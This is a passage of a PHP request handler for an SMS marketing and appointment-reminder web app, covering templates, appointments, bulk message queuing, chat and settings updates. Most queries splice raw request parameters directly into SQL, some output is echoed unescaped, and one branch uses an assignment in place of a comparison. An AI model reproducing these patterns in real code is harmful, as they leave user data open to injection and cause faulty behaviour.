                        title='".DBin($_REQUEST['tp_title'])."',

						content='".DBin($_REQUEST['tp_content'])."',

						saved_time='".date("Y-m-d h:i:sa")."'

					where

						id='".$_REQUEST['tp_id']."'";

            $res = mysqli_query($link,$sql);

            if ($res){

                $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! template save successfully</strong>.</div>';

            }else{

                $_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to save template</strong>.</div>';

            }
            header("location: view_template.php");
        }

        break;

		case "save_appointment":{

		    $totalReminders = getAppointmentReminders($_SESSION['user_id']);

            $limitReminders = getAssingnedPackageInfo($_SESSION['user_id'])['reminders'];

            if($totalReminders < $limitReminders) {

                $aptDate = date('Y-m-d', strtotime($_REQUEST['apt_date']));

                $aptTime = getTimeObj($_REQUEST['apt_time']);

                $dateTime = $aptDate . ' ' . $aptTime;

                $apt_message = '';//DBin($_REQUEST['apt_message'])

                $sql = "insert into appointments

						(

							title,

							apt_time,

							apt_message,

							group_id,

							phone_number,

							user_id

						)

					values

						(

							'" . DBin($_REQUEST['apt_title']) . "',

							'" . $dateTime . "',

							'" . $apt_message . "',

							'" . $_REQUEST['group_id'] . "',

							'" . $_REQUEST['phone_number_id'] . "',

							'" . $_SESSION['user_id'] . "'

						)";

                $res = mysqli_query($link, $sql);

                $aptID = mysqli_insert_id($link);

                if ($res) {

                    // adding alerts here.

                    for ($i = 0; $i < count($_REQUEST['before_time']); $i++) {

                        if ((trim($_REQUEST['before_time'][$i]) != '') && (trim($_REQUEST['before_message'][$i]) != '')) {

                            // uploading media

                            if ($_FILES['before_media']['name'][$i] != '') {

                                $ext = getExtension($_FILES['before_media']['name'][$i]);

                                if (in_array($ext, validImageExtensions())) {

                                    $fileName = uniqid() . '.' . $ext;

                                    $tmpName = $_FILES['before_media']['tmp_name'][$i];

                                    move_uploaded_file($tmpName, 'uploads/' . $fileName);

                                }

                            } else {

                                $fileName = '';

                            }

                            // end

                            $alerts = "insert into appointment_alerts

										(

											apt_id,

                                            message_date,

                                            message_time,

											apt_message,

											media,

											user_id

										)

									values

										(

											'" . $aptID . "',

                                            '" . $_REQUEST['before_date'][$i] . "',

                                            '" . $_REQUEST['before_time'][$i] . "',

											'" . DBin($_REQUEST['before_message'][$i]) . "',

											'" . $fileName . "',

											'" . $_SESSION['user_id'] . "'

										)";

                            mysqli_query($link, $alerts) or die(mysqli_error($link));

                        }

                    }

                    // end


                    // adding followups here.

                    for ($i = 0; $i < count($_REQUEST['delay_time']); $i++) {

                        if ((trim($_REQUEST['delay_time'][$i]) != '') && (trim($_REQUEST['delay_message'][$i]) != '')) {

                            // uploading media

                            if ($_FILES['delay_media']['name'][$i] != '') {

                                $ext = getExtension($_FILES['delay_media']['name'][$i]);

                                if (in_array($ext, validImageExtensions())) {

                                    $fileName = uniqid() . '.' . $ext;

                                    $tmpName = $_FILES['delay_media']['tmp_name'][$i];

                                    move_uploaded_file($tmpName, 'uploads/' . $fileName);

                                }

                            } else {

                                $fileName = '';

                            }

                            // end

                            $followup = "insert into appointment_followup_msgs

										(

											apt_id,

											message_date,

                                            message_time,

											apt_message,

											media,

											user_id

										)

									values

										(

											'" . $aptID . "',

											'" . $_REQUEST['delay_date'][$i] . "',

                                            '" .$_REQUEST['delay_time'][$i] . "',

											'" . DBin($_REQUEST['delay_message'][$i]) . "',

											'" . $fileName . "',

											'" . $_SESSION['user_id'] . "'

										)";

                            mysqli_query($link, $followup) or die(mysqli_error($link));

                        }

                    }

                    // end


                    // Sending appointment message.


                    $aptMessage = '';//$_REQUEST['apt_message'];


                    if ($_REQUEST['phone_number_id'] = 'all') { // Sending to whole group

                        $groupID = $_REQUEST['group_id'];

                        $sql = "select 

								s.id, 

								s.phone_number,

								c.phone_number as groupNumber,
								
								c.sender_id as groupSender_id

							from 

								subscribers s, 

								subscribers_group_assignment sga,

								campaigns c

							where

								sga.group_id='" . $groupID . "' and

								sga.subscriber_id=s.id and

								s.status='1' and

								c.id='" . $groupID . "'";

                        $res = mysqli_query($link, $sql);

                        if (mysqli_num_rows($res)) {

                            $userPkgStatus = checkUserPackageStatus($_SESSION['user_id']);

                            if ($userPkgStatus['go'] == false) {

                                $remainingCredits = 0;

                                die($userPkgStatus['message']);

                            } else {

                                $remainingCredits = $userPkgStatus['remaining_credits'];

                            }


                            $apt_date = date("Y-m-d h:i a", strtotime($dateTime));

                            $aptMessage = str_replace('%apt_date%', $apt_date, $aptMessage);

                            while ($row = mysqli_fetch_assoc($res)) {

                                $subsID = $row['id'];

                                $toNumber = $row['phone_number'];

                                $fromNumber = $row['groupNumber']; //$row['groupSender_id'];

                                //sendMessage($fromNumber, $toNumber, $aptMessage, array(), $_SESSION['user_id'], "", false);

                                // Scheduling alerts

                                $selAlts = "select * from appointment_alerts where apt_id='" . $aptID . "'";

                                $resAlts = mysqli_query($link, $selAlts);

                                if (mysqli_num_rows($resAlts)) {

                                    while ($rowAlts = mysqli_fetch_assoc($resAlts)) {

                                        $altTime = date('Y-m-d',strtotime($rowAlts['message_date'])).' '.getTimeObj($rowAlts['message_time']);

//                                        $altTime = $rowAlts['message_date'] . " " . $rowAlts['message_time'] . ":00";

                                        $alertMessage = DBout($rowAlts['apt_message']);

                                        if (trim($rowAlts['media']) != '') {

                                            $alertMedia = getServerUrl() . '/uploads/' . $rowAlts['media'];

                                        } else {

                                            $alertMedia = '';

                                        }

                                        $userID = $rowAlts['user_id'];


                                        $shcAlts = "insert into queued_msgs

													(

														to_number,

														from_number,

														message,

														media,

														type,

														message_time,

														user_id,

														group_id

													)

												values

													(

														'" . $toNumber . "',

														'" . $fromNumber . "',

														'" . $alertMessage . "',

														'" . $alertMedia . "',

														'2',

														'" . $altTime . "',

														'" . $userID . "',

														'" . $groupID . "'

													)";

                                        mysqli_query($link, $shcAlts);

                                    }

                                }

                                // end


                                // Scheduling followup

                                $selFollowup = "select * from appointment_followup_msgs where apt_id='" . $aptID . "'";

                                $resFollowup = mysqli_query($link, $selFollowup);

                                if (mysqli_num_rows($resFollowup)) {

                                    while ($rowFollowup = mysqli_fetch_assoc($resFollowup)) {

                                        $altTime = date('Y-m-d',strtotime($rowFollowup['message_date'])).' '.getTimeObj($rowFollowup['message_time']);

//                                        $altTime = $rowFollowup['message_date'] . " " . $rowFollowup['message_time'] . ":00";

                                        $alertMessage = DBout($rowFollowup['apt_message']);

                                        if (trim($rowFollowup['media']) != '') {

                                            $alertMedia = getServerUrl() . '/uploads/' . $rowFollowup['media'];

                                        } else {

                                            $alertMedia = '';

                                        }

                                        $userID = $rowFollowup['user_id'];

                                        $shcFollowup = "insert into queued_msgs

													(

														to_number,

														from_number,

														message,

														media,

														type,

											 			message_time,

														user_id,

														group_id

													)

												values

													(

														'" . $toNumber . "',

														'" . $fromNumber . "',

														'" . $alertMessage . "',

														'" . $alertMedia . "',

														'2',

														'" . $altTime . "',

														'" . $userID . "',

														'" . $groupID . "'

													)";

                                        mysqli_query($link, $shcFollowup);

                                    }

                                }

                                // end

                            }

                        }

                    } else { // sending to single number

                        $phoneID = $_REQUEST['phone_number_id'];

                        $groupID = $_REQUEST['group_id'];

                        $sql = "select

								s.phone_number,

								c.phone_number as groupNumber,
								
								c.sender_id as groupSender_id

							from 

								subscribers s,

								campaigns c

							where 

								s.id='" . $phoneID . "' and

								c.id='" . $groupID . "'";

                        $res = mysqli_query($link, $sql);

                        if (mysqli_num_rows($res)) {

                            $row = mysqli_fetch_assoc($res);

                            $userPkgStatus = checkUserPackageStatus($_SESSION['user_id']);

                            if ($userPkgStatus['go'] == false) {

                                $remainingCredits = 0;

                                die($userPkgStatus['message']);

                            } else {

                                $remainingCredits = $userPkgStatus['remaining_credits'];

                            }


                            $apt_date = date("Y-m-d h:i a", strtotime($dateTime));

                            $aptMessage = str_replace('%apt_date%', $apt_date, $aptMessage);

                            $toNumber = $row['phone_number'];

                            $fromNumber = $row['groupNumber']; //$row['groupSender_id'];

                            //sendMessage($fromNumber, $toNumber, $aptMessage, array(), $_SESSION['user_id'], "", false);

                            // Scheduling alerts

                            $selAlts = "select * from appointment_alerts where apt_id='" . $aptID . "'";

                            $resAlts = mysqli_query($link, $selAlts);

                            if (mysqli_num_rows($resAlts)) {

                                while ($rowAlts = mysqli_fetch_assoc($resAlts)) {

                                    $altTime = date('Y-m-d',strtotime($rowAlts['message_date'])).' '.getTimeObj($rowAlts['message_time']);

//                                    $altTime = $rowAlts['message_date'] . " " . $rowAlts['message_time'] . ":00";

                                    $alertMessage = DBout($rowAlts['apt_message']);

                                    if (trim($rowAlts['media']) != '') {

                                        $alertMedia = getServerUrl() . '/uploads/' . $rowAlts['media'];

                                    } else {

                                        $alertMedia = '';

                                    }

                                    $userID = $rowAlts['user_id'];


                                    $shcAlts = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													type,

													message_time,

													user_id,

													group_id

												)

											values

												(

													'" . $toNumber . "',

													'" . $fromNumber . "',

													'" . $alertMessage . "',

													'" . $alertMedia . "',

													'2',

													'" . $altTime . "',

													'" . $userID . "',

													'" . $groupID . "'

												)";

                                    mysqli_query($link, $shcAlts);

                                }

                            }

                            // end

                            // Scheduling followup

                            $selFollowup = "select * from appointment_followup_msgs where apt_id='" . $aptID . "'";

                            $resFollowup = mysqli_query($link, $selFollowup);

                            if (mysqli_num_rows($resFollowup)) {

                                while ($rowFollowup = mysqli_fetch_assoc($resFollowup)) {

                                    $altTime = date('Y-m-d',strtotime($rowFollowup['message_date'])).' '.getTimeObj($rowFollowup['message_time']);

//                                    $altTime = $rowFollowup['message_date'] . " " . $rowFollowup['message_time'] . ":00";

                                    $alertMessage = DBout($rowFollowup['apt_message']);

                                    if (trim($rowFollowup['media']) != '') {

                                        $alertMedia = getServerUrl() . '/uploads/' . $rowFollowup['media'];

                                    }

                                    $userID = $rowFollowup['user_id'];

                                    $shcFollowup = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													type,

													message_time,

													user_id,

													group_id

												)

											values

												(

													'" . $toNumber . "',

													'" . $fromNumber . "',

													'" . $alertMessage . "',

													'" . $alertMedia . "',

													'2',

													'" . $altTime . "',

													'" . $userID . "',

													'" . $groupID . "'

												)";

                                    mysqli_query($link, $shcFollowup);

                                }

                            }

                            // end

                        }

                    }

                    // end

                    $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! appointment save successfully</strong>.</div>';

                } else {

                    $_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to save appointment</strong>.</div>';

                }
            }else{
                $_SESSION['message'] = '<div class="alert alert-success">Your created reminders limit is exceeded, Currently created <b>'.$totalReminders.'</b> reminders(s). </div>';
            }

			header("location: view_apts.php");

		}

		break;

        case "save_template":{

            $sql = "insert into template

						(
                            title,
                            
							content,

							saved_time,

							user_id

						)

					values

						(
						    '".DBin($_REQUEST['tp_title'])."',

							'".DBin($_REQUEST['tp_content'])."',

							'".date("Y-m-d h:i:sa")."',
							
							'".$_SESSION['user_id']."'

						)";

            $res = mysqli_query($link,$sql);

            if ($res){

            $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! template save successfully</strong>.</div>';

            }else{

                $_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to save template</strong>.</div>';

            }
            header("location: view_template.php");
        }

        break;

		case "get_message_details":{

			$msgID = $_REQUEST['msg_id'];

			$sql = "select * from sms_history where id='".$msgID."'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$row = mysqli_fetch_assoc($res);

				if($row['is_sent']=='true'){

					if($row['direction']=='out-bound')

						$direction = 'Delivered';

					else

						$direction = 'Received';

				?>

					<div class="form-group">

						<label>Status: <?php echo $direction?>.</label><br />

						<span><?php echo $row['sms_sid']?></span>

					</div>

				<?php	

				}else{

				?>

					<div class="form-group">

						<label>Status: Failed.</label><br />

						<span><?php echo $row['sms_sid']?></span>

					</div>

				<?php	

				}

			}

		}

		break;

		

		case "add_nexmo_to_install":{

			$phoneNumber = $_REQUEST['phone_number'];

			$sql = "insert into users_phone_numbers

						(

							friendly_name,

							phone_number,

							iso_country,

							country,

							phone_sid,

							type,

							user_id

						)

					values

						(

							'".$phoneNumber."',

							'".$phoneNumber."',

							'US',

							'United States',

							'Nexmo',

							'3',

							'".$_SESSION['user_id']."'

						)";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! number assigned to application.</strong> .</div>';

				echo '1';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to assign number to application.</strong> .</div>';

				echo '0';

			}

		}

		break;

		

		case "remove_nexmo_from_install":{

			$phoneNumber = $_REQUEST['phone_number'];

			$sql = "delete from users_phone_numbers where phone_number='".$phoneNumber."' and user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! number removed from application.</strong> .</div>';

				echo '1';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to remove number from application.</strong> .</div>';

				echo '0';

			}

		}

		break;

		

		case "get_gateway_countries":{

			$adminSettings = getAppSettings("",true);

			$gateway = $_REQUEST['gateway'];

			if($gateway=='twilio'){

				$countries = getTwilioCountries($adminSettings['twilio_sid'],$adminSettings['twilio_token']);

				for($i=0;$i<count($countries->Countries->Country);$i++){

					if($countries->Countries->Country[$i]->CountryCode=="US")

						$sele = 'selected="selected"';

					else

						$sele = '';

					echo '<option '.$sele.' value="'.$countries->Countries->Country[$i]->CountryCode.'">'.$countries->Countries->Country[$i]->Country.'</option>';

				}

			}else if($gateway=='plivo'){

				echo '<option value="US">United States</option>';

			}else if($gateway=='nexmo'){

				echo '<option value="US">United States</option>';

			}

		}

		break;

		

		case "process_bulk_sms":{

			$appSettings = getAppSettings($_SESSION['user_id']);

			date_default_timezone_set($appSettings['time_zone']);

			$bulkType = $_REQUEST['bulk_type'];

			$client   = $_REQUEST['client_id'];

			$fromNum  = $_REQUEST['from_number'];

			$groupID  = $_REQUEST['group_id'];

			$phoneID  = $_REQUEST['phone_number_id'];

			$startDate= $_REQUEST['start_date'];

			$endDate  = $_REQUEST['end_date'];

			$daterangeGroupID = $_REQUEST['daterange_group_id'];

			$smsID    = $_REQUEST['hidden_sms_id'];

			$bulkSMS  = getBulkSMS($smsID);

			$smsText  = $bulkSMS['message'];

			$smsMedia = $bulkSMS['bulk_media'];

			

			if($client=='all'){ // All clients

				if($bulkType=='1'){ // Single number/Group

					if($groupID=='all'){ // To all groups numbers

						$sql = "select 

									c.id, 

									c.title, 

									s.phone_number

								from 

									campaigns c, 

									subscribers s, 

									subscribers_group_assignment sga

								where

									c.id=sga.group_id and

									sga.subscriber_id=s.id and 

									s.status='1'

								group by

									s.phone_number";

						$res = mysqli_query($link,$sql);

						if(mysqli_num_rows($res)){

							$index = 0;

							while($row = mysqli_fetch_assoc($res)){

								$toNumber   = $row['phone_number'];

								$fromNumber = $fromNum;

								$ins = "insert into queued_msgs

											(

												to_number,

												from_number,

												message,

												media,

												send_to_user,

												user_id,

												group_id,

												sms_gateway,

												created_date

											)

										values

											(

												'".$toNumber."',

												'".$fromNumber."',

												'".DBin($smsText)."',

												'".$smsMedia."',

												'".$client."',

												'".$_SESSION['user_id']."',

												'".$row['id']."',

												'".$appSettings['sms_gateway']."',

												'".date('Y-m-d H:i:s')."'

											)";

								mysqli_query($link,$ins);

								$index++;

							}

							$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

						}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';

						}

					}else{ // single group, all, single number

						if($phoneID=='all'){ // to whole group

							$sql = "select 

										s.phone_number 

									from 

										subscribers s, 

										subscribers_group_assignment sga 

									where

										sga.group_id='".$groupID."' and

										sga.subscriber_id=s.id

									group by s.phone_number";

							$res = mysqli_query($link,$sql);

							if(mysqli_num_rows($res)){

								$index = 0;

								while($row = mysqli_fetch_assoc($res)){

									$toNumber   = $row['phone_number'];

									$fromNumber = $fromNum;

									

									$ins = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													send_to_user,

													user_id,

													group_id,

													sms_gateway,

													created_date

												)

											values

												(

													'".$toNumber."',

													'".$fromNumber."',

													'".DBin($smsText)."',

													'".$smsMedia."',

													'".$client."',

													'".$_SESSION['user_id']."',

													'".$groupID."',

													'".$appSettings['sms_gateway']."',

													'".date('Y-m-d H:i:s')."'

												)";

									mysqli_query($link,$ins);

									$index++;

								}

								$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

							}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';

						}

					}else{ // to single number

							$sql = "select phone_number from subscribers where id='".$phoneID."'";

							$res = mysqli_query($link,$sql);

							if(mysqli_num_rows($res)){

								$row = mysqli_fetch_assoc($res);

								$toNumber   = $row['phone_number'];

								$fromNumber = $fromNum;

								$ins = "insert into queued_msgs

											(

												to_number,

												from_number,

												message,

												media,

												send_to_user,

												user_id,

												group_id,

												sms_gateway,

												created_date

											)

										values

											(

												'".$toNumber."',

												'".$fromNumber."',

												'".DBin($smsText)."',

												'".$smsMedia."',

												'".$client."',

												'".$_SESSION['user_id']."',

												'".$groupID."',

												'".$appSettings['sms_gateway']."',

												'".date('Y-m-d H:i:s')."'

											)";

								mysqli_query($link,$ins);

								$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$toNumber.' subscriber.</strong></div>';

							}else{

								$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';	

							}

						}

					}

				}			

			}else{ // Single client

				if($bulkType=='1'){ // Single number/Group

					if($groupID=='all'){ // To all groups numbers

						$sql = "select 

									c.id, 

									c.title, 

									s.phone_number

								from 

									campaigns c, 

									subscribers s, 

									subscribers_group_assignment sga

								where

									c.user_id='".$client."' and

									c.id=sga.group_id and

									sga.subscriber_id=s.id and 

									s.status='1'

								group by

									s.phone_number";

						$res = mysqli_query($link,$sql);

						if(mysqli_num_rows($res)){

							$index = 0;

							while($row = mysqli_fetch_assoc($res)){

								$toNumber   = $row['phone_number'];

								$fromNumber = $fromNum;

								$ins = "insert into queued_msgs

											(

												to_number,

												from_number,

												message,

												media,

												send_to_user,

												user_id,

												group_id,

												sms_gateway,

												created_date

											)

										values

											(

												'".$toNumber."',

												'".$fromNumber."',

												'".DBin($smsText)."',

												'".$smsMedia."',

												'".$client."',

												'".$_SESSION['user_id']."',

												'".$row['id']."',

												'".$appSettings['sms_gateway']."',

												'".date('Y-m-d H:i:s')."'

											)";

								mysqli_query($link,$ins);

								$index++;

							}

							$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

						}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';

						}

					}else{ // single group, all, single number

						if($phoneID=='all'){ // to whole group

							$sql = "select 

										s.phone_number 

									from 

										subscribers s, 

										subscribers_group_assignment sga 

									where

										sga.group_id='".$groupID."' and

										sga.subscriber_id=s.id

									group by s.phone_number";

							$res = mysqli_query($link,$sql);

							if(mysqli_num_rows($res)){

								$index = 0;

								while($row = mysqli_fetch_assoc($res)){

									$toNumber   = $row['phone_number'];

									$fromNumber = $fromNum;

									

									$ins = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													send_to_user,

													user_id,

													group_id,

													sms_gateway,

													created_date

												)

											values

												(

													'".$toNumber."',

													'".$fromNumber."',

													'".DBin($smsText)."',

													'".$smsMedia."',

													'".$client."',

													'".$_SESSION['user_id']."',

													'".$groupID."',

													'".$appSettings['sms_gateway']."',

													'".date('Y-m-d H:i:s')."'

												)";

									mysqli_query($link,$ins);

									$index++;

								}

								$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

							}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';

						}

					}else{ // to single number

							$sql = "select phone_number from subscribers where id='".$phoneID."'";

							$res = mysqli_query($link,$sql);

							if(mysqli_num_rows($res)){

								$row = mysqli_fetch_assoc($res);

								$toNumber   = $row['phone_number'];

								$fromNumber = $fromNum;

								$ins = "insert into queued_msgs

											(

												to_number,

												from_number,

												message,

												media,

												send_to_user,

												user_id,

												group_id,

												sms_gateway,

												created_date

											)

										values

											(

												'".$toNumber."',

												'".$fromNumber."',

												'".DBin($smsText)."',

												'".$smsMedia."',

												'".$client."',

												'".$_SESSION['user_id']."',

												'".$groupID."',

												'".$appSettings['sms_gateway']."',

												'".date('Y-m-d H:i:s')."'

											)";

								mysqli_query($link,$ins);

								$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$toNumber.' subscriber.</strong></div>';

							}else{

								$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';	

							}

						}

					}

				}else{ // Date range, single client

					if($_REQUEST['daterange_group_id']=='all'){ // to all group

						$startDate = date('Y-m-d',strtotime($_REQUEST['start_date']));

						$endDate   = date('Y-m-d',strtotime($_REQUEST['end_date']));

						$daterangeGroupID   = $_REQUEST['daterange_group_id'];

						$sql = "select

									subscriber_id

								from

									subscribers_group_assignment

								where

									user_id='".$client."'";

						$res = mysqli_query($link,$sql)or die(mysqli_error($link));

						if(mysqli_num_rows($res)){

							$index = 0;

							while($row = mysqli_fetch_assoc($res)){

								$sel = "select

											phone_number

										from

											subscribers

										where

											id='".$row['subscriber_id']."' and

											date(created_date) between '".$startDate."' and 

											'".$endDate."'

										group by

											phone_number";

								$exe = mysqli_query($link,$sel);

								if(mysqli_num_rows($exe)){

									while($numbers = mysqli_fetch_assoc($exe)){

										$toNumber  = $numbers['phone_number'];

										$fromNumber= $fromNum;

										$ins = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													send_to_user,

													user_id,

													group_id,

													sms_gateway,

													created_date

												)

											values

												(

													'".$toNumber."',

													'".$fromNumber."',

													'".DBin($smsText)."',

													'".$smsMedia."',

													'".$client."',

													'".$_SESSION['user_id']."',

													'".$daterangeGroupID."',

													'".$appSettings['sms_gateway']."',

													'".date('Y-m-d H:i:s')."'

												)";

										mysqli_query($link,$ins);

									}

								}else{}

								$index++;

							}

							$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

						}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! No subscriber found.</strong></div>';

						}						

					}else{ // single group

						$startDate = date('Y-m-d',strtotime($_REQUEST['start_date']));

						$endDate   = date('Y-m-d',strtotime($_REQUEST['end_date']));

						$daterangeGroupID   = $_REQUEST['daterange_group_id'];

						$sql = "select

									subscriber_id

								from

									subscribers_group_assignment

								where

									group_id='".$daterangeGroupID."' and

									user_id='".$client."'";

						$res = mysqli_query($link,$sql)or die(mysqli_error($link));

						if(mysqli_num_rows($res)){

							$index = 0;

							while($row = mysqli_fetch_assoc($res)){

								$sel = "select

											phone_number

										from

											subscribers

										where

											id='".$row['subscriber_id']."' and

											date(created_date) between '".$startDate."' and 

											'".$endDate."'

										group by

											phone_number";

								$exe = mysqli_query($link,$sel)or die(mysqli_error($link));

								if(mysqli_num_rows($exe)){

									while($numbers = mysqli_fetch_assoc($exe)){

										$toNumber  = $numbers['phone_number'];

										$fromNumber= $fromNum;

										$ins = "insert into queued_msgs

												(

													to_number,

													from_number,

													message,

													media,

													send_to_user,

													user_id,

													group_id,

													sms_gateway,

													created_date

												)

											values

												(

													'".$toNumber."',

													'".$fromNumber."',

													'".DBin($smsText)."',

													'".$smsMedia."',

													'".$client."',

													'".$_SESSION['user_id']."',

													'".$daterangeGroupID."',

													'".$appSettings['sms_gateway']."',

													'".date('Y-m-d H:i:s')."'

												)";

										mysqli_query($link,$ins)or die(mysqli_error($link));

									}

									$index++;

								}else{}

							}

							$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! message sent to '.$index.' subscribers.</strong></div>';

						}else{

							$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! no subscriber found.</strong></div>';

						}

					}

				}

			}

			$url = getServerUrl().'/cron.php';

			//mail('ahsan@nimblewebsolutions.com','cron url',$url);

			post_curl_mqs($url,array());

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "load_chat":{

			$phoneID = $_REQUEST['phoneID'];

			$sql = "select ch.*, s.phone_number, s.first_name from chat_history ch, subscribers s where ch.phone_id='".$phoneID."' and s.id=ch.phone_id order by id asc";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)>0){

				while($row = mysqli_fetch_assoc($res)){

					$ago = timeAgo($row['created_date']);

					if($row['direction']=='in'){

		?>

				<li class="left clearfix"><span class="chat-img pull-left">

					<img src="http://placehold.it/50/55C1E7/fff&text=U" alt="User Avatar" class="img-circle" />

				</span>

					<div class="chat-body clearfix">

						<div class="header chat_header">

							<strong class="primary-font"><?php echo $row['first_name']?></strong> <small class="pull-right text-muted">

								<span class="fa fa-clock-o"></span><?php echo $ago?></small>

						</div>

						<p><?php echo DBout($row['message'])?></p>

					</div>

				</li>

		<?php				

					}else{

		?>

				<li class="right clearfix"><span class="chat-img pull-right">

					<img src="http://placehold.it/50/FA6F57/fff&text=ME" alt="User Avatar" class="img-circle" />

				</span>

					<div class="chat-body clearfix">

						<div class="header chat_header">

							<small class=" text-muted"><span class="fa fa-clock-o"></span><?php echo $ago?></small>

							<strong class="pull-right primary-font"><?php echo $_SESSION['first_name']?></strong>

						</div>

						<p><?php echo DBout($row['message'])?></p>

					</div>

				</li>

		<?php				

					}

					$up = "update 

								chat_history

							set

								is_read='1'

							where

								id='".$row['id']."'";

					mysqli_query($link,$up);

				}

			}else{

		?>

				<li class="right clearfix">

					<div class="chat-body clearfix">

						<p>

							No chat history to display.								

						</p>

					</div>

				</li>

		<?php			

			}

		}

		break;

		

		case "save_chat_message":{

			$userPkgStatus = checkUserPackageStatus($_SESSION['user_id']);

			if($userPkgStatus['go']==false){

				$remainingCredits = 0;

				die($userPkgStatus['message']);

			}else{

				$remainingCredits = $userPkgStatus['remaining_credits'];

			}

			$client = getTwilioConnection($_SESSION['user_id']);

			$to		= urldecode($_REQUEST['To']);

			$from   = urldecode($_REQUEST['From']);

			$body	= urldecode($_REQUEST['chatMessage']);

			$msgSid = sendMessage($from,$to,$body,array(),$_SESSION['user_id'],"",true);

			$sql = "insert into chat_history

						(

							phone_id,

							message,

							direction,

							user_id,

							message_sid,

							created_date

						)

					values

						(

							'".$_REQUEST['phone_id']."',

							'".DBin($body)."',

							'out',

							'".$_SESSION['user_id']."',

							'".DBin($msgSid)."',

							'".date('Y-m-d H:i:s')."'

						)";

			$res = mysqli_query($link,$sql)or die(mysqli_error($link));

			if($res){

				echo '1';

			}else{

				echo $msgSid;

			}

		}

		break;

		

		case "generate_apikey":{

			echo generateAPIKey();

		}

		break;

		

		case "update_email_templates":{

			$sql = "update application_settings set

						email_subject='".DBin($_REQUEST['email_subject'])."',

						new_app_user_email='".$_REQUEST['new_app_user_email']."',

						email_subject_for_admin_notification='".$_REQUEST['email_subject_for_admin_notification']."',

						new_app_user_email_for_admin='".$_REQUEST['new_app_user_email_for_admin']."',

						success_payment_email_subject='".DBin($_REQUEST['success_payment_email_subject'])."',

						success_payment_email='".DBin($_REQUEST['success_payment_email'])."',

						failed_payment_email_subject='".$_REQUEST['failed_payment_email_subject']."',

						failed_payment_email='".DBin($_REQUEST['failed_payment_email'])."',

						payment_noti_subject='".DBin($_REQUEST['payment_noti_subject'])."',

						payment_noti_email='".DBin($_REQUEST['payment_noti_email'])."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Email templates are updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_propend_msgs":{

			$sql = "update application_settings set

						append_text='".DBin($_REQUEST['append_text'])."',

						typo_message='".DBin($_REQUEST['typo_message'])."',

						unsub_message='".DBin($_REQUEST['unsub_message'])."',

						gdpr_message='".DBin($_REQUEST['gdpr_message'])."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Messages are updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

        

        case "update_beacon_credentials":{

			$sql = "update application_settings set

						estimote_app_id='".DBin($_REQUEST['estimote_app_id'])."',

						estimote_app_token='".DBin($_REQUEST['estimote_app_token'])."' 

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Beacon Credentials are updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

        

        		

		case "update_pricing_details":{

			$sql = "update application_settings set

						incoming_sms_charge='".$_REQUEST['incoming_sms_charge']."',

						outgoing_sms_charge='".$_REQUEST['outgoing_sms_charge']."',

						mms_credit_charges='".$_REQUEST['mms_credit_charges']."',

						per_credit_charges='".$_REQUEST['per_credit_charges']."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

